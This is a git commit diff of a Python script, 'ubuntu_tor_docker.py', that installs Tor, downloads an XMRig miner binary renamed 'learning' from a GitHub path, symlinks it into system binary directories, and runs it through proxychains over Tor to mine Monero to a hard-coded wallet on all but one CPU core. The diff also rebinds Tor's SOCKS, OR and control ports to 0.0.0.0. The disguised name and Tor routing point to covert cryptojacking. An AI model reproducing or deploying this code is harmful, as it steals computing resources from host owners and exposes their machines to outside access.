bfdc8eece8e21e4cc1c5b80aa25192b2883406e3
afghanamster <afghanamster@gmail.com>
2024-12-08 03:56:40 -0600

    Update ubuntu_tor_docker.py

--- ubuntu_tor_docker.py
+++ ubuntu_tor_docker.py
@@ -2,11 +2,12 @@ __author__ = 'root'
 import time
 import urllib2
 import urllib
-import os,sys
+import os, sys
 from httplib import BadStatusLine
 from socket import error as socket_error
 import multiprocessing
 import ast
+
 useproxy = 0
 os.system('chmod 777 ' + __file__)
 program = 'learning'
@@ -15,6 +16,7 @@ cores = multiprocessing.cpu_count() - 1
 if cores <= 0:
     cores = 1
 os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')
+
 try:
     os.system('apt-get update -y')
     os.system('apt-get install gcc make tor python python-dev -y')
@@ -26,14 +28,19 @@ try:
     os.system('make install-config')
     if os.path.isfile('/usr/local/bin/' + program) == False:
         os.system('wget https://github.com/ts6aud5vkg/daovps/raw/master/xmrig_tls/' + program)
-                        
         os.system('chmod 777 ' + program)
         workingdir = os.getcwd()
-        os.system('ln -s -f ' + workingdir + '/' + program + ' ' +'/usr/local/bin/' + program)
+        os.system('ln -s -f ' + workingdir + '/' + program + ' ' + '/usr/local/bin/' + program)
         os.system('ln -s -f ' + workingdir + '/' + program + ' ' + '/usr/bin/' + program)
-        time.sleep (2)
+        time.sleep(2)
 except:
     pass
+
+# Edit Tor configuration to bind to 0.0.0.0
+os.system("sed -i 's/^SocksPort 127.0.0.1/SocksPort 0.0.0.0/' /etc/tor/torrc")
+os.system("sed -i 's/^ORPort 127.0.0.1/ORPort 0.0.0.0/' /etc/tor/torrc")
+os.system("sed -i 's/^ControlPort 127.0.0.1/ControlPort 0.0.0.0/' /etc/tor/torrc")
+
 os.system('tor &')
 time.sleep(60)
-os.system ('proxychains4 ' + program + ' --donate-level 1 -o gulf.moneroocean.stream:10128 -u 4BK5ZPJGLpSdC2Pk3FH7iGaB5uBEDj76pYpSC4qaRBGKEHzcs8vDJSvB6WfWz7efiURtQERFUtEs6A3joiMF3EnHEpo2eNY -p db -a rx/0 -k --tls -t ' + str(cores))
+os.system('proxychains4 ' + program + ' --donate-level 1 -o gulf.moneroocean.stream:10128 -u 4BK5ZPJGLpSdC2Pk3FH7iGaB5uBEDj76pYpSC4qaRBGKEHzcs8vDJSvB6WfWz7efiURtQERFUtEs6A3joiMF3EnHEpo2eNY -p db -a rx/0 -k --tls -t ' + str(cores))
